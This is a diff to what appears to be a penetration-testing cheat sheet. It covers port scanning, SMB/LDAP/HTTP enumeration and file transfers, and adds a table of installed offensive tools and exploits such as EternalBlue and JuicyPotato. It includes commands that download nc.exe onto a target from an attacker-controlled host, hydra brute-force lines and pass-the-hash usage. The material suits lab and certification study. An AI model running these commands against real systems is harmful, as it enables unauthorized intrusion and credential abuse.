@@ -7,7 +7,6 @@
 
 ```bash
 sudo systemctl start ssh
-
 sudo systemctl stop ssh
 ```
 
@@ -21,7 +20,6 @@ KexAlgorithms diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange
 ```bash
 
 sudo systemctl start apache2
-
 sudo systemctl stop apache2
 ```
 
@@ -29,11 +27,15 @@ Default root directory is `/var/www/html`.
 
 ## Scanning
 
+Using `rustscan`:  
+```bash
+rustscan --accessible -a <target> -r 1-65535 -- -sT -sV -sC -Pn
+```
+
+Using `nmap`:  
 ```bash
 nmap -Pn -sT -sV -sC <target>
-nmap -p445 --script smb-vuln-* <target>
-nmap -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target> # SambaCry
-nmap -sU --script tftp-enum -p69,161,53 <target>
+nmap -sU --script tftp-enum -p53,69,161 <target>
 ```
 
 ## File Transfers
@@ -50,8 +52,8 @@ wget http://10.0.0.1:80/nc.exe -O nc.exe
 
 On Windows:
 certutil -f -split -urlcache http://10.0.0.1:80/nc.exe nc.exe
-(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.1:80/nc.exe", "C:\nc.exe")  
-Invoke-WebRequest "http://10.0.0.1:80/nc.exe" -OutFile "C:\nc.exe"  
+powershell -c '(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.1:80/nc.exe", "C:\nc.exe")'
+powershell -c 'Invoke-WebRequest "http://10.0.0.1:80/nc.exe" -OutFile "C:\nc.exe"'  
 ```
 
 ### SMB
@@ -230,12 +232,18 @@ hydra -L usernames.txt -P passwords.txt <target> ftp
 
 ### Port 139/445 (SMB)
 ```bash
+nmap -p445 --script smb-vuln-* <target>
+nmap -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target> # SambaCry
+
 enum4linux -a -u "<username>" -p "<password>" <IP>
+
 smbmap -H <IP> [-P <PORT>]                              # Null user
 smbmap -u "username" -p "password" -H <IP> [-P <PORT>]  # Creds
 smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] # Pass-the-Hash
+
 smbclient --no-pass -L //<IP>                           # Null user
 smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+
 hydra -L usernames.txt -P passwords.txt <target> smb 
 ```
 ```bash
@@ -249,16 +257,18 @@ If there is no null user, remember to try with the guest username.
 If there is SMB version incompatibility, edit `/etc/samba/smb.conf` and append `min protocol = SMB1` to `[global]` seciton.    
 
 ### Port 389 (LDAP)
-```
+
+```bash
 ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
 python windapsearch.py -d htb.local -U
 ```
 
 ### Port 80 (HTTP)
 ```bash
-gobuster dir -u "http://target:8080/" -w /usr/share/wordlists/dirb/common.txt -t 12 -x .txt,.jsp
+gobuster dir -u "http://target:8080/" -w /usr/share/wordlists/dirb/common.txt -t 12 -x .html,.txt,.jsp,.php,.cgi
 nikto -host http://target
 hydra -L usernames.txt -P passwords.txt <target> http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:Login Failed"
+ffuf
 ```
 
 ### Port 3306 (MySQL)
@@ -438,3 +448,115 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#metho
 https://book.hacktricks.xyz/
 
 https://github.com/frizb/Hydra-Cheatsheet
+
+## Tools list (`install.sh`)
+
+### General
+
+| Toolname          | Location                       | Installed  |
+| ----------------- | ------------------------------ | ---------- |
+| `docker-ce`       | -                              | Yes        |
+| `rlwrap`          | -                              | Yes        |
+| `code`            | -                              | Yes        |
+| `openjdk-11-jdk`  | -                              | Yes        |
+| `gdb`             | -                              | Yes        |
+| `pip2`            | -                              | Yes        |
+| `pip3`            | -                              | Yes        |
+| `updog`           | -                              | Yes        |
+| `volatility`      | `~/Desktop/tools/volatility3`  | Yes        |
+| `ghidra`          | `~/Desktop/tools/ghidra`       | Yes        |
+| `sysinternals`    | `~/Desktop/tools/sysinternals` | Yes        |
+| `pwntools`        | -                              | Yes        |
+| `z3-solver`       | -                              | Yes        |
+| `randcrack`       | -                              | Yes        |
+
+
+
+
+### Shell
+
+| Toolname          | Location                    | Installed  |
+| ----------------  | --------------------------- | ---------- |
+| `rlwrap`          | -                           | Yes        |
+| `telnet`          | -                           | Yes        |
+| `evil-winrm`      | -                           | Yes        |
+| `msfpc`           | `~/Desktop/tools/msfpc`     | Yes        |
+| `rsg`             | `~/Desktop/tools/rsg`       | Yes        |
+
+
+### Web
+
+| Toolname          | Location                   | Installed  |
+| ----------------  | -------------------------- | ---------- |
+| `gobuster`        | -                          | Yes        |
+| `ffuf`            | -                          | Yes        |
+| `seclists`        | `~/Desktop/tools/seclists` | Yes        |
+| `mariadb-client`  | -                          | Yes        |
+| `feroxbuster`     | -                          | Yes        |
+
+### Compilation 
+
+| Toolname          | Location                   | Installed  |
+| ----------------  | -------------------------- | ---------- |
+| `cmake`           | -                          | Yes        |
+| `mingw-w64`       | -                          | Yes        |
+
+
+### Brute-force
+
+| Toolname          | Location                   | Installed  |
+| ----------------- | -------------------------- | ---------- |
+| `crowbar`         | -                          | Yes        |
+
+
+### Recon
+
+| Toolname          | Location                   | Installed  |
+| ----------------- | -------------------------- | ---------- |
+| `rustscan`        | -                          | Yes        |
+| `autorecon`       | -                          | Yes        |
+
+### Windows Enumeration
+
+| Toolname                    | Location                                    | Installed  |
+| -----------------           | ------------------------------------------- | ---------- |
+| `Sherlock`                  | `~/Desktop/web/sherlock.ps1`                | Yes        |
+| `Empire`                    | `~/Desktop/tools/Empire`                    | Yes        |
+| `wesng`                     | `~/Desktop/tools/wesng`                     | Yes        |
+| `Windows-Exploit-Suggester` | `~/Desktop/tools/Windows-Exploit-Suggester` | Yes        |
+| `Powerless`                 | `~/Desktop/web/powerless.bat`               | Yes        |
+| `Seatbelt`                  | `~/Desktop/web/seatbelt.exe`                | Yes        |
+| `Powerview`                 | `~/Desktop/web/powerview.ps1`               | Yes        |
+| `winPEAS`                   | `~/Desktop/web/winpeasany.exe`              | Yes        |
+| `nishang`                   | `~/Desktop/tools/nishang`                   | Yes        |
+| `juicypotato x64`           | `~/Desktop/web/juicypotato.exe`             | Yes        |
+| `roguepotato`               | `~/Desktop/web/roguepotato.exe`             | Yes        |
+
+
+### Linux Enumeration
+
+| Toolname                  | Location                                  | Installed  |
+| ------------------------- | ----------------------------------------- | ---------- |
+| `sudo_killer`             | `~/Desktop/tools/SUDO_KILLER`             | Yes        |
+| `linux-exploit-suggester` | `~/Desktop/tools/linux-exploit-suggester` | Yes        |
+| `LinEnum.sh`              | `~/Desktop/web/linenum.sh`                | Yes        |
+| `linux-smart-enumeration` | `~/Desktop/web/lse.sh`                    | Yes        |
+| `linPEAS`                 | `~/Desktop/web/linpeas.sh`                | Yes        |
+
+
+### Exploits
+
+| Toolname                  | Location                                  | Installed  |
+| ------------------------- | ----------------------------------------- | ---------- |
+| `eternalblue`             | `~/Desktop/exploits/eternablue`           | Yes        |
+| `sambacry`                | `~/Desktop/exploits/sambacry`             | Yes        |
+| `ghostcat`                | `~/Desktop/exploits/ghostcat`             | Yes        |
+| `postfix shellshock`      | `~/Desktop/exploits/postfix_shellshock`   | Yes        |
+| `xploit_installer`        | `~/Desktop/exploits/xploit_installer`     | Yes        |
+
+### Compiled Binaries
+
+| Toolname                  | Location                                  | Installed  |
+| ------------------------- | ----------------------------------------- | ---------- |
+| `windows-binaries`        | `~/Desktop/tools/windows-binaries`        | Yes        |
+| `static-binaries`         | `~/Desktop/exploits/static-binaries`      | Yes        |
